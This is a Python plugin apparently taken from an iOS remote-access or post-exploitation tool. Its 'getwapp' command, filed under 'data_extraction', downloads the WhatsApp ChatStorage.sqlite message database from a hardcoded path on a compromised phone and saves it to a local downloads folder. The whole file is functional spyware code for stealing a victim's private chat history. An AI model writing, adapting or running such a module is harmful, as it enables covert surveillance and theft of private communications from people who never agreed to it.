import json
import os
import modules.helper as h


class command:
    def __init__(self):
        self.name = "getwapp"
        self.description = "download Whatsapp database file"
        self.category = "data_extraction"

    def run(self, session, cmd_data):
        file_name = "ChatStorage.sqlite"
        h.info_general("Downloading {0}".format(file_name))
        data = session.download_file('/private/var/mobile/Containers/Shared/AppGroup/D135448A-EDA9-417C-B6BE-53B0F614C3E2/'+file_name)
        if data:
            h.info_general("Saving {0}".format(file_name))
            f = open(os.path.join('downloads', file_name), 'wb')
            f.write(data)
            f.close()
            h.info_general("Saved to ./downloads/{0}".format(file_name))
            session.wa_fetched = True